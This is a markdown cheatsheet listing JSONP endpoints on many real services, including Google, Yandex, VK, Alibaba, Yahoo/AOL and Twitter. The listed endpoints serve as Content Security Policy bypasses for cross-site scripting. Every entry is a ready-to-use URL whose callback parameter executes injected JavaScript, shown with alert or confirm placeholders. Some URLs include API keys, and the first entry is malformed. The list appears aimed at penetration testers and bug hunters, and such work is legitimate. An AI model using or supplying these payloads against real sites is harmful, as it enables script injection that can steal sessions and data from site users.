# Useful Cheatsheet

## Table of Contents
- [JSONP Bypasses](#jsonp-bypasses)

### JSONP Bypasses
#### Google.com:
```
https1//www.google.com/complete/search?client=chrome&q=hello&callback=alert#### 1
https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)
https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)
https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)
https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)
https://maps.googleapis.com/maps/api/js?key=[REPLACE_BY_GOOGLE_API_KEY_FROM_CURRENT_WEBSITE]&callback=alert(1337)
```
#### Blogger.com:
```
https://www.blogger.com/feeds/5578653387562324002/posts/summary/4427562025302749269?callback=alert(1337)
```
#### Yandex:
```
https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert(1337)
https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert
```
#### VK.com:
```
https://api.vk.com/method/wall.get?callback=alert(1337)
```
#### Marketo.com
```
http://app-sjint.marketo.com/index.php/form/getKnownLead?callback=alert()
http://app-e.marketo.com/index.php/form/getKnownLead?callback=alert()
```
#### AlibabaGroup:
```
https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)
https://suggest.taobao.com/sug?callback=alert(1337)
https://count.tbcdn.cn//counter3?callback=alert(1337)
https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)
https://wb.amap.com/channel.php?callback=alert(1337)
http://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback=confirm(1);jsonp1
http://api.m.sm.cn/rest?method=tools.sider&callback=jsonp_1869510867%3balert(1)%2f%2f794
```
#### Uber.com:
```
https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);
```
#### Buzzfeed.com
```
https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f
```
#### Yahoo JP (Thanks to @nizam0906)
```
https://mempf.yahoo.co.jp/offer?position=h&callback=alert(1337)//></script>
https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1337)//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-></script>
```
#### AOL/Yahoo
```
https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389
https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679
https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374
https://api.cmi.aol.com/catalog/cms/help-central-usaol-navigation-utility?callback=confirm(1);//jQuery20108887725116629929_152807105037740504&_=1528071050378
https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();
https://search.yahoo.com/sugg/gossip/gossip-us-ura/?f=1&.crumb=wYtclSpdh3r&output=sd1&command=&pq=&l=1&bm=3&appid=exp-ats1.l7.search.vip.ir2.yahoo.com&t_stmp=1571806738592&nresults=10&bck=1he6d8leq7ddu%26b%3D3%26s%3Dcb&csrcpvid=8wNpljk4LjEYuM1FXaO1vgNfMTk1LgAAAAA5E2a9&vtestid=&mtestid=&spaceId=1197804867&callback=confirm
https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389
https://ui.comet.aol.com/?module=header%7Cleftnav%7Cfooter&channel=finance&portfolios=true&domain=portfolios&collapsed=1&callback=confirm(9)//jQuery21307555521146732187_1538371213486&_=1538371213487
http://portal.pf.aol.com/jsonmfus/?service=myportfolios,&porttype=1&portmax=100&callback=confirm(9)//jQuery1710788849030856973_1538354104695&_=1538354109053
```
#### Twitter.com:
```
http://search.twitter.com/trends.json?callback=alert()
https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()
https://twitter.com/status/user_timeline/kbeautysalon.json?count=1&callback=confirm()
```
#### Others:
```
https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)
https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)
https://passport.ngs.ru/ajax/check?callback=alert(1337)
https://ulogin.ru/token.php?callback=alert(1337)
https://www.meteoprog.ua/data/weather/informer/Poltava.js?callback=alert(1337)
https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)
https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)
https://api.mixpanel.com/track/?callback=alert(1337)
https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)
http://ads.pictela.net/a/proxy/shoplocal/alllistings/d5dadac1578db80a/citystatezip=10008;pd=40B5B0493316E5A3D4A389374BC5ED3ED8C7AB99817408B4EF64205A5B936BC45155806F9BF419E853D2FCD810781C;promotioncode=Petco-140928;sortby=23;listingimageflag=y;listingimagewidth=300;resultset=full;listingcount=100;;callback=alert(1);/json
https://adserver.adtechus.com/pubapi/3.0/9857.1/3792195/0/170/ADTECH;noperf=1;cmd=bid;bidfloor=0.12;callback=confirm(1);//window.proper_d31c1edc_57a8d6de_38
```
#### Google API's
```
https://ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337
https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();
```
